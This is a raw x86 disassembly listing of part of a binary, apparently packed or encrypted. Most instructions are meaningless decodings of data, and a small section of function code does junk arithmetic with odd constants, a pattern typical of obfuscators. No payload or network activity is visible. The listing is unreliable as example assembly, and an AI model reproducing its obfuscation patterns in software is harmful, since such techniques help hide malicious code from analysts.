  4146a7:	add    eax,0x58037e8e
  4146ac:	push   ebx
  4146ad:	add    al,0xec
  4146af:	push   ds
  4146b0:	cmp    BYTE PTR [edi+0x36620800],bl
  4146b6:	fistp  QWORD PTR [edx]
  4146b8:	retf   0x245f
  4146bb:	cmp    ch,al
  4146bd:	or     DWORD PTR [ebx-0x6e],esp
  4146c0:	int    0x18
  4146c2:	leave  
  4146c3:	sub    BYTE PTR [eax-0x68],ch
  4146c6:	in     al,0xa5
  4146c8:	jge    0x4146c0
  4146ca:	xchg   ecx,eax
  4146cb:	sbb    dl,BYTE PTR [edi+0x6a90d3ea]
  4146d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146d2:	call   DWORD PTR [edi+0xc]
  4146d5:	mov    bh,BYTE PTR [edi]
  4146d7:	jg     0x4146bf
  4146d9:	sbb    BYTE PTR [ecx],ah
  4146db:	(bad)  
  4146dc:	mov    gs:0x19c18cbf,eax
  4146e2:	jo     0x414754
  4146e4:	inc    ebx
  4146e5:	xchg   DWORD PTR [edx-0x1b],ecx
  4146e8:	pop    eax
  4146e9:	test   DWORD PTR [ebx+0x448d412f],esp
  4146ef:	mov    ebp,0x25e2e2f0
  4146f4:	cdq    
  4146f5:	jae    0x41467c
  4146f7:	pop    DWORD PTR [edx-0x6e]
  4146fa:	cmp    esi,DWORD PTR [ebx+eiz*1-0x10af275b]
  414701:	ins    BYTE PTR es:[edi],dx
  414702:	mov    edi,0xdd47419e
  414707:	pop    ss
  414708:	adc    DWORD PTR [ecx+0x547267e],0x38
  41470f:	popa   
  414710:	out    dx,eax
  414711:	pop    eax
  414712:	sub    eax,DWORD PTR ds:0xbfb18865
  414718:	push   ss
  414719:	mov    ecx,0xb946711
  41471e:	shl    BYTE PTR [esi+0x26e1678],cl
  414724:	scas   al,BYTE PTR es:[edi]
  414725:	xor    BYTE PTR [eax-0x13791d94],bh
  41472b:	sub    esi,ebp
  41472d:	add    BYTE PTR [eax+0x4841ccc1],al
  414733:	push   edi
  414734:	mov    dh,0x12
  414736:	aaa    
  414737:	in     eax,0xa1
  414739:	jne    0x41479b
  41473b:	xor    bl,BYTE PTR [ebp+0x545e7093]
  414741:	cmp    al,0x0
  414743:	jg     0x4147c4
  414745:	iret   
  414746:	inc    ecx
  414747:	jl     0x414784
  414749:	push   ebx
  41474a:	fisub  WORD PTR [ecx-0x6b]
  41474d:	jmp    0x47da51de
  414752:	xor    ecx,DWORD PTR [edx-0x28]
  414755:	jo     0x4147a7
  414757:	jno    0x41472c
  414759:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41475b:	lock aad 0xb4
  41475e:	ror    DWORD PTR [eax+0x69],cl
  414761:	pushf  
  414762:	nop
  414763:	pop    ebp
  414764:	pop    esi
  414765:	sbb    bh,BYTE PTR [edx+edi*2+0x64dd80]
  41476c:	xchg   edx,eax
  41476d:	adc    eax,0xc7c61dca
  414772:	xlat   BYTE PTR ds:[ebx]
  414773:	dec    ecx
  414774:	lahf   
  414775:	inc    esi
  414776:	stc    
  414777:	les    ebp,FWORD PTR [ebx+edi*1-0x41]
  41477b:	shr    dh,cl
  41477d:	loopne 0x4147b6
  41477f:	(bad)  
  414780:	out    0x70,eax
  414782:	sti    
  414783:	adc    bl,ch
  414785:	outs   dx,DWORD PTR ds:[esi]
  414786:	pop    ebx
  414787:	xchg   edx,eax
  414788:	cld    
  414789:	jnp    0x414809
  41478b:	mov    ch,0x1b
  41478d:	dec    ebp
  41478e:	test   eax,0xa477579c
  414793:	push   ebp
  414794:	hlt    
  414795:	repnz fnstsw WORD PTR [esi]
  414798:	mov    al,BYTE PTR [ebp-0x38]
  41479b:	push   0x1e
  41479d:	dec    ebx
  41479e:	pop    ebx
  41479f:	push   eax
  4147a0:	inc    ebp
  4147a1:	shr    BYTE PTR [edi],0x5e
  4147a4:	cmp    BYTE PTR [ebx+0x1bf046c1],bl
  4147aa:	fisubr DWORD PTR [edi+0x79ec6c34]
  4147b0:	shl    DWORD PTR fs:[esi+0x2222d7c5],0xe7
  4147b8:	retf   0xb24
  4147bb:	cmp    bh,BYTE PTR [ebp-0x41]
  4147be:	in     eax,dx
  4147bf:	mov    eax,0x30e5e84
  4147c4:	fisttp WORD PTR [ebx]
  4147c6:	(bad)  
  4147c7:	int    0x55
  4147c9:	pop    es
  4147ca:	(bad)  
  4147cb:	dec    esi
  4147cc:	mov    BYTE PTR [eax],ah
  4147ce:	mov    edi,0x3a1659a2
  4147d3:	retf   0x905b
  4147d6:	jns    0x41475e
  4147d8:	push   cs
  4147d9:	cmp    al,0x60
  4147db:	sbb    eax,0xdec3d06f
  4147e0:	inc    edi
  4147e1:	adc    edi,eax
  4147e3:	add    ecx,DWORD PTR [ecx+0x54]
  4147e6:	jp     0x4147fc
  4147e8:	fnstenv [ebp-0x3c]
  4147eb:	repz fiadd WORD PTR [eax-0x77]
  4147ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147f0:	js     0x414786
  4147f2:	dec    edx
  4147f3:	cmp    BYTE PTR ds:0xbcbdab53,bl
  4147f9:	ficom  WORD PTR [eax]
  4147fb:	(bad)  
  4147fd:	xlat   BYTE PTR ds:[ebx]
  4147fe:	mov    edi,eax
  414800:	adc    DWORD PTR [edx+0x31daa7b4],ecx
  414806:	xor    ebx,DWORD PTR [esi+0x21aa818f]
  41480c:	enter  0x342c,0xc1
  414810:	push   es
  414811:	imul   ebx,DWORD PTR [ecx],0xffffffd4
  414814:	lock fmul DWORD PTR [ebx]
  414817:	retf   
  414818:	fmul   st(2),st
  41481a:	and    al,0xf2
  41481c:	int3   
  41481d:	pop    eax
  41481e:	sub    al,0x9a
  414820:	cmp    DWORD PTR [eax-0x418601ca],ecx
  414826:	sub    edx,DWORD PTR [ebx]
  414828:	push   ss
  414829:	(bad)  
  41482a:	out    dx,al
  41482b:	or     BYTE PTR [ebx-0x7c],al
  41482e:	arpl   WORD PTR [edi],cx
  414830:	lock lds edx,FWORD PTR [ecx+0x7de512f3]
  414837:	hlt    
  414838:	cmp    ah,bl
  41483a:	dec    esi
  41483b:	mov    esp,0x4557f973
  414840:	jae    0x41485d
  414842:	leave  
  414843:	ds repnz cdq 
  414846:	scas   al,BYTE PTR es:[edi]
  414847:	sub    DWORD PTR [eax],eax
  414849:	out    0xc8,al
  41484b:	sub    al,0xae
  41484d:	sub    DWORD PTR [eax-0x7309438],ecx
  414853:	mov    al,0xf9
  414855:	int    0xaa
  414857:	mov    ebp,0xf06df123
  41485c:	jae    0x414861
  41485e:	mov    ds:0x582f390c,eax
  414863:	test   al,0xf9
  414865:	retf   0x9bf0
  414868:	repnz mov eax,ds:0xdf41765
  41486e:	lahf   
  41486f:	mov    ah,0x39
  414871:	xor    al,BYTE PTR [ebx+0x76]
  414874:	stos   BYTE PTR es:[edi],al
  414875:	pushf  
  414876:	pop    edi
  414877:	xor    BYTE PTR [edi+edi*8],bh
  41487a:	push   ds
  41487b:	data16 fs (bad) 
  41487e:	dec    eax
  41487f:	out    0xf9,eax
  414881:	push   ebp
  414882:	repz mov ecx,0xf473cecf
  414888:	sbb    ebp,ebx
  41488a:	cs inc ecx
  41488c:	xchg   edi,eax
  41488d:	and    ebp,ebx
  41488f:	retf   0x300f
  414892:	jle    0x4148e4
  414894:	cwde   
  414895:	mov    esi,0xdd6330ff
  41489a:	mov    ah,0x19
  41489c:	inc    ecx
  41489d:	popa   
  41489e:	outs   dx,BYTE PTR ds:[esi]
  41489f:	inc    edi
  4148a0:	pop    edi
  4148a1:	call   0xe58b:0x1bdb34a0
  4148a8:	sub    al,0xd7
  4148aa:	aaa    
  4148ab:	outs   dx,BYTE PTR ds:[esi]
  4148ac:	xor    eax,0x20a3d61f
  4148b1:	add    DWORD PTR [ebx],edx
  4148b3:	mov    esp,0xfd903f8a
  4148b8:	push   edi
  4148b9:	and    eax,0x9513427f
  4148be:	push   0xffffffce
  4148c0:	es (bad) 
  4148c2:	retf   0xaef7
  4148c5:	add    al,0x6b
  4148c7:	xchg   edi,eax
  4148c8:	sti    
  4148c9:	and    al,0x7c
  4148cb:	sub    al,0x5f
  4148cd:	clc    
  4148ce:	cs inc edi
  4148d0:	sub    edx,DWORD PTR [edi-0x2c]
  4148d3:	pop    esi
  4148d4:	mov    ds:0xa481cc65,al
  4148d9:	ror    BYTE PTR [eax],0xc3
  4148dc:	retf   
  4148dd:	xor    edi,eax
  4148df:	ss pop edi
  4148e1:	push   edx
  4148e2:	add    al,BYTE PTR [ebp-0x32d1cefc]
  4148e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148e9:	mov    edi,0xdb118243
  4148ee:	and    al,0xa
  4148f0:	jne    0x41492b
  4148f2:	fisub  WORD PTR [ecx+0x47ef20c9]
  4148f8:	aad    0x1
  4148fa:	(bad)  
  4148fb:	pop    edx
  4148fc:	fsub   QWORD PTR [ecx+0x35]
  4148ff:	sub    al,0xab
  414901:	xchg   esi,eax
  414902:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414903:	mov    dh,BYTE PTR [ebp+ebx*4-0x7164b345]
  41490a:	dec    eax
  41490b:	sub    al,0xb3
  41490d:	xor    BYTE PTR [ecx+0x1a],bl
  414910:	pop    esp
  414911:	push   ss
  414912:	cmp    eax,0x2029048b
  414917:	pop    ecx
  414918:	dec    edx
  414919:	jmp    0xb72df8a5
  41491e:	loope  0x4148c6
  414920:	mov    dl,0x4b
  414922:	leave  
  414923:	pop    ds
  414924:	jle    0x414976
  414926:	fwait
  414927:	mov    ah,0xa4
  414929:	inc    edi
  41492a:	xchg   edx,eax
  41492b:	xor    eax,DWORD PTR [esi+0x69f0736c]
  414931:	arpl   WORD PTR [edx+0x2a],si
  414934:	pop    ebp
  414935:	cmp    al,BYTE PTR [ebx+0x4b71698a]
  41493b:	shl    edx,0x6d
  41493e:	(bad)  
  41493f:	stos   BYTE PTR es:[edi],al
  414940:	ret    0xc134
  414943:	and    BYTE PTR fs:0x4d8bf781,dh
  41494a:	cld    
  41494b:	mov    eax,0xffffeff8
  414950:	mov    edx,eax
  414952:	sub    edx,ecx
  414954:	add    edx,DWORD PTR [ebp-0x8]
  414957:	mov    ecx,DWORD PTR [ebp-0xc]
  41495a:	or     edx,ecx
  41495c:	mov    ecx,DWORD PTR [ebp-0x4]
  41495f:	imul   edx,edx,0x85300
  414965:	sub    eax,ecx
  414967:	add    eax,DWORD PTR [ebp-0x8]
  41496a:	mov    ecx,DWORD PTR [ebp-0xc]
  41496d:	or     eax,ecx
  41496f:	mov    ecx,DWORD PTR [ebp+0x8]
  414972:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  414979:	add    eax,0x40e5
  41497e:	imul   eax,eax,0x214c
  414984:	jmp    0x414d49
  414989:	retf   0x46a0
  41498c:	mov    ds:0xa02a1a22,al
  414991:	pop    es
  414992:	inc    ecx
  414993:	repnz push 0xffffffcf
  414996:	and    al,BYTE PTR [ecx-0x42]
  414999:	mov    ebx,DWORD PTR [eax+ebx*1]
  41499c:	sbb    al,dl
  41499e:	adc    bl,BYTE PTR [eax]
  4149a0:	sbb    BYTE PTR [ecx-0x420951cb],ch
  4149a6:	sub    ecx,DWORD PTR [ebp+0x2]
  4149a9:	and    al,0xee
  4149ab:	out    0x8f,al
  4149ad:	sbb    eax,0x54ec61f0
  4149b2:	cmp    BYTE PTR [eax+0x4f263340],cl
  4149b8:	stos   DWORD PTR es:[edi],eax
  4149b9:	push   ecx
  4149ba:	ret    
  4149bb:	loop   0x4149e1
  4149bd:	cmp    eax,0x99b388a3
  4149c2:	loope  0x4149c6
  4149c4:	out    0xdd,al
  4149c6:	jbe    0x4149a7
  4149c8:	aad    0xd
  4149ca:	mov    eax,ds:0x13299f2b
  4149cf:	xchg   ebx,eax
  4149d0:	jnp    0x414a05
  4149d2:	das    
  4149d3:	sbb    esp,ebx
  4149d5:	aam    0x3a
  4149d7:	arpl   WORD PTR [edx],si
  4149d9:	sbb    cl,cl
  4149db:	mov    dh,0x20
  4149dd:	jge    0x41497d
  4149df:	add    al,0x65
  4149e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149e2:	pushf  
  4149e3:	lahf   
  4149e4:	call   0x917b:0x78e296f
  4149eb:	push   edi
  4149ec:	unpcklps xmm3,xmm2
  4149ef:	mov    dl,0xd4
  4149f1:	dec    esi
  4149f2:	(bad)  
  4149f3:	cmp    DWORD PTR [ecx+0x67],edx
  4149f6:	pushf  
  4149f7:	jns    0x414a63
  4149f9:	leave  
  4149fa:	sbb    DWORD PTR [edi],esp
  4149fc:	inc    esp
  4149fd:	js     0x414a14
  4149ff:	sbb    al,0xaa
  414a01:	icebp  
  414a02:	jp     0x414a0f
  414a04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a05:	xor    dl,BYTE PTR [ebx-0x24]
  414a08:	xchg   edx,eax
  414a09:	jns    0x9c763aa1
  414a0f:	repz pop esi
  414a11:	jl     0x414a87
  414a13:	or     DWORD PTR [edi-0x2b],esp
  414a16:	mov    gs,WORD PTR [esi-0x32]
  414a19:	(bad)  
  414a1a:	cli    
  414a1b:	dec    edi
  414a1c:	arpl   WORD PTR [ecx+0x6f2d5c3f],dx
  414a22:	mov    eax,0x82327331
  414a27:	pop    DWORD PTR [esi+0x67]
  414a2a:	out    0x60,eax
  414a2c:	and    DWORD PTR [edx+0x865b7bb],edi
  414a32:	push   edx
  414a33:	or     ch,ah
  414a35:	sub    DWORD PTR [ebx],ebx
  414a37:	pop    ds
  414a38:	nop
  414a39:	dec    ebx
  414a3a:	not    BYTE PTR [eax-0x17]
  414a3d:	test   al,0xa3
  414a3f:	mov    ch,0x19
  414a41:	pop    esp
  414a42:	(bad)  [edx+0x3937fd9]
  414a48:	cmc    
  414a49:	pusha  
  414a4a:	adc    BYTE PTR [ebx-0x5b9c4e48],0x2d
  414a51:	mov    ebp,ebp
  414a53:	repz out 0x97,eax
  414a56:	int3   
  414a57:	xchg   ebp,eax
  414a58:	lds    esi,FWORD PTR [esi+0x7a09b49c]
  414a5e:	je     0x414a72
  414a60:	popa   
  414a61:	dec    ecx
  414a62:	mov    ds,WORD PTR [ebx+edi*2+0x51727ccb]
  414a69:	test   BYTE PTR [esi+0x2e36386a],dl
  414a6f:	lods   al,BYTE PTR ds:[esi]
  414a70:	imul   ebx,DWORD PTR [eax+eiz*1],0xa6ba0701
  414a77:	and    edi,DWORD PTR [eax-0x1e]
  414a7a:	xor    BYTE PTR [esi],bl
  414a7c:	adc    eax,0x19c8fd53
  414a81:	dec    ebx
  414a82:	cmp    DWORD PTR [edi-0x5b],ebx
  414a85:	pushf  
  414a86:	and    al,0x2f
  414a88:	and    al,0x95
  414a8a:	push   edi
  414a8b:	jle    0x414af3
  414a8d:	dec    edx
  414a8e:	fisub  DWORD PTR [edx-0x5dd95cca]
  414a94:	jnp    0x414ab7
  414a96:	cdq    
  414a97:	adc    ebp,DWORD PTR [eax-0x3d]
  414a9a:	inc    ebp
  414a9b:	push   ebp
  414a9c:	or     dl,BYTE PTR [eax]
  414a9e:	xor    bl,ah
  414aa0:	sub    BYTE PTR ds:0xc3ece148,bh
  414aa6:	aas    
  414aa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414aa8:	or     esi,eax
  414aaa:	sbb    DWORD PTR [edx+0x2cf93a10],0xf4f8ea21
  414ab4:	arpl   WORD PTR [ebx+0x19edaf83],dx
  414aba:	(bad)  [edi+0x6a79f0ae]
  414ac0:	sub    eax,DWORD PTR [edi]
  414ac2:	jns    0x414b26
  414ac4:	add    DWORD PTR [edx-0x28],esi
  414ac7:	clc    
  414ac8:	fcomp  DWORD PTR [eax]
  414aca:	mov    ah,0x4a
  414acc:	mov    ecx,0x96577b75
  414ad1:	in     al,dx
  414ad2:	mov    dl,0x93
  414ad4:	adc    DWORD PTR [edi],edx
  414ad6:	xchg   ebp,eax
  414ad7:	pop    esi
  414ad8:	dec    ecx
  414ad9:	dec    ecx
  414ada:	cld    
  414adb:	retf   
  414adc:	aaa    
  414add:	push   ebx
  414ade:	xlat   BYTE PTR ds:[ebx]
  414adf:	xor    BYTE PTR [ebx],ah
  414ae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ae2:	or     bh,BYTE PTR [edx+0x70]
  414ae5:	inc    ebx
  414ae6:	pop    ebx
  414ae7:	dec    edi
  414ae8:	es enter 0xce9d,0x2
  414aed:	mov    ds:0xf2591af7,eax
  414af2:	jmp    0x414ac7
  414af4:	out    0xbb,al
  414af6:	gs jnp 0x414ab2
  414af9:	adc    BYTE PTR ds:0x7defa72e,dl
  414aff:	push   ecx
  414b00:	push   ebp
  414b01:	sub    DWORD PTR [esi-0x14591e4b],eax
  414b07:	and    eax,0xdf0512dd
  414b0c:	ja     0x414ae1
  414b0e:	jne    0x414ae9
  414b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b11:	xchg   ecx,eax
  414b12:	jae    0x414b73
  414b14:	mov    ch,0x78
  414b16:	pop    ds
  414b17:	pushf  
  414b18:	pop    edx
  414b19:	jmp    0xa6feedaa
  414b1e:	cli    
  414b1f:	adc    ch,BYTE PTR [ecx-0x4a]
  414b22:	jnp    0x414aad
  414b24:	adc    al,0x6c
  414b26:	mov    WORD PTR [ebp-0xa],gs
  414b29:	scas   eax,DWORD PTR es:[edi]
  414b2a:	retf   0x6033
  414b2d:	mov    ecx,0x9d92da75
  414b32:	pop    esp
  414b33:	add    ebx,esi
  414b35:	mov    al,0xcb
  414b37:	out    0x2d,eax
  414b39:	jecxz  0x414b87
  414b3b:	jmp    0x414ae8
  414b3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b3e:	imul   edi,DWORD PTR ds:0x4ee1d009,0x129fb0ff
  414b48:	cmp    dh,dl
  414b4a:	in     al,dx
  414b4b:	sti    
  414b4c:	leave  
  414b4d:	inc    edi
  414b4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b4f:	xchg   DWORD PTR [esi],eax
  414b51:	(bad)  
  414b52:	aad    0x83
  414b54:	xchg   edx,eax
  414b55:	and    ch,BYTE PTR [edi]
  414b57:	and    dh,BYTE PTR [esp+ebp*8+0x73]
  414b5b:	push   edi
  414b5c:	add    esi,eax
  414b5e:	ret    
  414b5f:	es push 0xe740ec09
  414b65:	test   eax,0x3fe8d023
  414b6a:	push   ecx
  414b6b:	pusha  
  414b6c:	ror    DWORD PTR [ebx+0x6d],cl
  414b6f:	ror    BYTE PTR [ebx+ecx*4+0x20],1
  414b73:	sub    DWORD PTR [edi+0x3e63b21f],ecx
  414b79:	loopne 0x414bc4
  414b7b:	inc    ebp
  414b7c:	hlt    
  414b7d:	das    
  414b7e:	(bad)  
  414b80:	(bad)  
  414b81:	jbe    0x414b75
  414b83:	push   esi
  414b84:	push   ss
  414b85:	dec    eax
  414b86:	outs   dx,DWORD PTR ds:[esi]
  414b87:	lods   eax,DWORD PTR ds:[esi]
  414b88:	jmp    0xb99f:0xeaf01f10
  414b8f:	adc    ebp,DWORD PTR [ebp-0x2f64752f]
  414b95:	xor    al,0x8a
  414b97:	mov    ebx,0x9d43a7b2
  414b9c:	ffreep st(5)
  414b9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b9f:	mov    WORD PTR [esi+0x74a60d97],gs
  414ba5:	ror    DWORD PTR [ecx+0x42],1
  414ba8:	iret   
  414ba9:	jge    0x414b6a
  414bab:	xchg   edx,eax
  414bac:	inc    esi
  414bad:	inc    ebx
  414bae:	xchg   edx,eax
  414baf:	mov    ebp,0x26973257
  414bb4:	and    ah,cl
  414bb6:	push   cs
  414bb7:	pop    es
  414bb8:	jae    0x414c14
  414bba:	jp     0x414c18
  414bbc:	shl    DWORD PTR ds:0xa79bc961,0x99
  414bc3:	sub    dh,BYTE PTR [edi-0x59]
  414bc6:	cmp    al,0x42
  414bc9:	or     eax,0xe2bde58d
  414bce:	int3   
  414bcf:	fcom   QWORD PTR [ecx]
  414bd1:	std    
  414bd2:	push   esi
  414bd3:	das    
  414bd4:	push   esi
  414bd5:	lock mov edi,0xae430b19
  414bdb:	xchg   ebp,eax
  414bdc:	adc    BYTE PTR [edx+0x51],bl
  414bdf:	sbb    al,0x4b
  414be1:	pop    edi
  414be2:	inc    ebx
  414be3:	inc    esp
  414be4:	sub    al,cl
  414be6:	push   es
  414be7:	add    BYTE PTR [ebx-0x37b8cc8e],bh
  414bed:	call   0x811f:0xb56e9813
  414bf4:	aam    0x51
  414bf6:	arpl   WORD PTR [edi-0x6c7303c],cx
  414bfc:	mov    ebx,0xd5406482
  414c01:	je     0x414c36
  414c03:	imul   esi,DWORD PTR fs:[ecx+0x53],0xffffff8e
  414c08:	std    
  414c09:	mov    al,0x72
  414c0b:	stos   DWORD PTR es:[edi],eax
  414c0c:	mov    ds:0x5337d02a,eax
  414c11:	jge    0x414c24
  414c13:	pushf  
  414c14:	add    dl,ah
  414c16:	mov    ds:0xfbb97c0d,al
  414c1b:	jle    0x414c4f
  414c1d:	sbb    BYTE PTR [ebx-0x6c8dfc1d],ah
  414c23:	xchg   ebp,eax
  414c24:	push   ds
  414c25:	shl    DWORD PTR [edi+0x2483296d],0x2c
  414c2c:	out    0xe,eax
  414c2e:	int    0xf8
  414c30:	mov    ah,0x62
  414c32:	icebp  
  414c33:	mov    ds:0x75b1c580,eax
  414c38:	jo     0x414c3b
  414c3a:	pop    es
  414c3b:	out    0xd3,eax
  414c3d:	lahf   
  414c3e:	lds    esp,FWORD PTR [ecx]
  414c40:	sbb    eax,0x8d4f1177
  414c45:	xchg   ecx,eax
  414c46:	not    DWORD PTR [edi-0x5c650e9f]
  414c4c:	das    
  414c4d:	push   cs
  414c4e:	lds    esi,FWORD PTR [edx-0xb4cd7df]
  414c54:	ret    
  414c55:	adc    eax,0xb4cccc84
  414c5a:	and    al,0x8f
  414c5c:	aas    
  414c5d:	vpsubb ymm0,ymm5,YMMWORD PTR [edi+edi*1+0x4899f5a0]
  414c66:	iret   
  414c67:	lds    ecx,FWORD PTR [ecx]
  414c69:	inc    esp
  414c6a:	sbb    dl,cl
  414c6c:	iret   
  414c6d:	dec    ebp
  414c6e:	mov    cl,0x93
  414c70:	jo     0x414c9a
  414c72:	mov    BYTE PTR [ebp-0x18],ah
  414c75:	leave  
  414c76:	cld    
  414c77:	je     0x414cb9
  414c79:	xlat   BYTE PTR ds:[ebx]
  414c7a:	add    bh,BYTE PTR [eax-0x2c]
  414c7d:	popf   
  414c7e:	xchg   esi,eax
  414c7f:	popf   
  414c80:	aaa    
  414c81:	jle    0x414c90
  414c83:	push   esp
  414c84:	cwde   
  414c85:	sbb    dl,dh
  414c87:	cwde   
  414c88:	mul    eax
  414c8a:	mov    bl,0x8b
  414c8c:	mov    ds:0x5f02dbbb,eax
  414c91:	retf   
  414c92:	fs cmc 
  414c94:	mov    DWORD PTR [edx],esi
  414c96:	and    cl,ch
  414c98:	pop    ecx
  414c99:	and    BYTE PTR [ecx+esi*1-0x2bf966de],cl
  414ca0:	add    DWORD PTR [ebp+edi*4+0x50b76a25],0x6e
  414ca8:	inc    eax
  414ca9:	xchg   ecx,eax
  414caa:	not    edi
  414cac:	sbb    esp,DWORD PTR [eax-0x5f]
  414caf:	es cdq 
  414cb1:	les    edx,FWORD PTR [esi+0x4abd03ea]
  414cb7:	push   esi
  414cb8:	and    BYTE PTR [ecx-0x3],cl
  414cbb:	(bad)  
  414cbd:	push   ss
  414cbe:	scas   al,BYTE PTR es:[edi]
  414cbf:	sbb    BYTE PTR [ebx],ah
  414cc1:	push   esi
  414cc2:	or     eax,0x3398b66f
  414cc7:	sbb    bh,ah
  414cc9:	arpl   ax,bx
  414ccb:	popf   
  414ccc:	in     al,dx
  414ccd:	scas   al,BYTE PTR es:[edi]
  414cce:	xchg   BYTE PTR [ecx],al
  414cd0:	je     0x414d38
  414cd2:	sub    al,0x20
  414cd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cd5:	enter  0xb49c,0xa8
  414cd9:	cmp    esp,ebx
  414cdb:	and    al,0x74
  414cdd:	lods   al,BYTE PTR ds:[esi]
  414cde:	xchg   edi,eax
  414cdf:	push   cs
  414ce0:	in     al,dx
  414ce1:	retf   0x30a5
  414ce4:	xor    al,dh
  414ce6:	cmp    ch,BYTE PTR [edx-0x11]
  414ce9:	pop    ebx
  414cea:	xchg   BYTE PTR [ecx],dh
  414cec:	call   0x5c4e5c0
  414cf1:	pop    ecx
  414cf2:	jnp    0x414d64
  414cf4:	sti    
  414cf5:	sahf   
  414cf6:	cwde   
  414cf7:	jmp    0x414d19
  414cf9:	xlat   BYTE PTR ds:[ebx]
  414cfa:	fstp   DWORD PTR [esi-0x15]
  414cfd:	pop    ebx
  414cfe:	in     al,0x69
  414d00:	mov    bh,0xaf
  414d02:	rcr    BYTE PTR [esi+0x212c7699],1
  414d08:	retf   
  414d09:	call   0xb91d:0x9b90d24f
  414d10:	(bad)  
  414d12:	aaa    
  414d13:	cmp    dl,BYTE PTR [edi+0x5df2775d]
  414d19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d1a:	jb     0x414cf4
  414d1c:	ins    BYTE PTR es:[edi],dx
  414d1d:	inc    esi
  414d1e:	addr16 jmp 0xafd455a2
  414d24:	xchg   esp,eax
  414d25:	mov    dl,0xe9
  414d27:	push   ss
  414d28:	xlat   BYTE PTR ds:[ebx]
  414d29:	mov    ch,ah
  414d2b:	inc    ebp
  414d2c:	test   ebp,edx
  414d2e:	call   0x7e2767a4
  414d33:	pushf  
  414d34:	add    DWORD PTR [esi+0x575f6e88],esi
  414d3a:	ds mov ecx,0x5f73984f
  414d40:	aas    
  414d41:	les    esp,FWORD PTR [ecx+0x24]
  414d44:	dec    eax
  414d45:	lods   al,BYTE PTR ds:[esi]
  414d46:	shl    DWORD PTR [ebx],1
  414d48:	or     al,0x3
  414d4a:	ror    DWORD PTR [ebx-0x37fcf7b3],0x89
  414d51:	dec    ebp
  414d52:	or     BYTE PTR [ebx+0x4d8bdc45],cl
  414d58:	fsub   DWORD PTR [ebx]
  414d5a:	ror    DWORD PTR [ebx-0x3edc2bb3],0x8b
  414d61:	dec    ebp
  414d62:	ror    BYTE PTR [edi],1
  414d64:	scas   eax,DWORD PTR es:[edi]
  414d65:	ror    DWORD PTR [ebx-0x3ef433b3],0x8b
  414d6c:	dec    ebp
  414d6d:	enter  0xaf0f,0xc1
  414d71:	mov    ecx,DWORD PTR [ebp+0x8]
  414d74:	sub    eax,0x777ea653
  414d79:	cmp    DWORD PTR [ecx+0x54],eax
  414d7c:	je     0x414d8a
  414d82:	mov    eax,DWORD PTR [ebp+0x8]
  414d85:	jmp    0x414dd1
  414d8a:	mov    eax,DWORD PTR [ebp-0x3c]
  414d8d:	sub    eax,0x5258
  414d92:	xor    eax,0x49e9
  414d97:	add    eax,0x253
  414d9c:	jmp    0x414dd1
  414da1:	mov    DWORD PTR [ebp-0x3c],0x4177
  414da8:	mov    DWORD PTR [ebp+0x8],0x1405
  414daf:	mov    eax,DWORD PTR [ebp+0x8]
  414db2:	mov    ecx,DWORD PTR [ebp-0x3c]
  414db5:	imul   eax,eax,0x58cc
  414dbb:	add    eax,0x3f39
  414dc0:	and    eax,ecx
  414dc2:	add    eax,0x3b90
  414dc7:	or     eax,0x4b1c
  414dcc:	sub    eax,0x7fdd
  414dd1:	leave  
  414dd2:	ret    0x4
  414dd5:	push   ebp
  414dd6:	mov    ebp,esp
  414dd8:	and    esp,0xfffffff8
  414ddb:	sub    esp,0x20
  414dde:	push   ebx
  414ddf:	push   esi
  414de0:	lea    eax,[esp+0x10]
  414de4:	mov    DWORD PTR [esp+0xc],eax
  414de8:	mov    eax,DWORD PTR [esp+0xc]
  414dec:	mov    ecx,DWORD PTR [esp+0x10]
  414df0:	jmp    0x4151d4
  414df5:	sbb    eax,0x1afa8288
  414dfa:	cli    
  414dfb:	sbb    al,0x26
  414dfd:	retf   0xbdbd
  414e00:	mov    al,0xfe
  414e02:	add    cl,BYTE PTR [edi+0x7e]
  414e05:	inc    edx
  414e06:	push   ss
  414e07:	push   ss
  414e08:	sbb    BYTE PTR [edx-0x19e7e7ee],dl
  414e0e:	mov    ah,0xf5
  414e10:	idiv   DWORD PTR [eax+0xc]
  414e13:	inc    eax
  414e14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e15:	push   es
  414e16:	lock int 0x76
  414e19:	leave  
  414e1a:	inc    ebp
  414e1b:	pop    eax
  414e1c:	cmp    DWORD PTR [edx+0x5d],eax
  414e1f:	sbb    bl,BYTE PTR [ebp+ebp*2+0x8]
  414e23:	push   ss
  414e24:	mov    eax,ds:0xb743cda7
  414e29:	pop    esi
  414e2a:	mov    cl,0x2e
  414e2c:	not    DWORD PTR [ecx]
  414e2e:	mov    esp,0x2feda7b4
  414e33:	add    edi,esi
  414e35:	aaa    
  414e36:	shl    DWORD PTR [ebx+0x45],1
  414e39:	jge    0x414e0c
  414e3b:	jp     0x414dcb
  414e3d:	(bad)  
  414e3e:	mov    al,0x12
  414e40:	(bad)  [ebp-0x133ad75c]
  414e46:	or     al,0x22
  414e48:	push   edi
  414e49:	push   es
  414e4a:	sbb    al,BYTE PTR [esi-0x1080c619]
  414e50:	iret   
  414e51:	inc    esi
  414e52:	das    
  414e53:	cld    
  414e54:	jnp    0x414e0f
  414e56:	mov    ch,0xce
  414e58:	sub    ah,BYTE PTR [edi-0x3dfe23fb]
  414e5e:	js     0x414e87
  414e60:	pop    edi
  414e61:	shr    dl,cl
  414e63:	cmp    BYTE PTR [eax+eax*2+0x12],cl
  414e67:	dec    ecx
